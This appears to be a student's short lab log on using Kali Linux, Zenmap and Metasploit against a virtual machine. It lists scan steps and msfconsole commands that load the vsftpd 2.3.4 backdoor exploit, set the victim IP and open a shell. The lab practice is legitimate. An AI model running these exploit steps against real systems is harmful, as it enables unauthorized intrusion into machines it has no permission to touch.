Using Kali Linux and Metasploit (using virtual lab)

---
## 2025-08-14
**Steps:**  
- Open Zen map and scan for IP with quick scan.
- Find the IP of the virtual machine to exploit.
- Scan that IP for open ports with intense scan in Zen map.
- Select the vulnerability to exploit.
- Learn about that port and vulnerability from Rapid 7 on Google.

**Commands/Tools practiced:**  
```
`msfconsole`
 `search <open port>`
 example `search vsftpd 2.3.4`
 Interact with a module by name or index. For example **info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor**
 `use 1`
 `show options` ( to check requirements)
 (as per requirement)
 `set RHOSTS <IP of the victim pc>`
 `exploit`
 `ls` (for the list)
 `shell` (for proper format)
 `help`
 
```
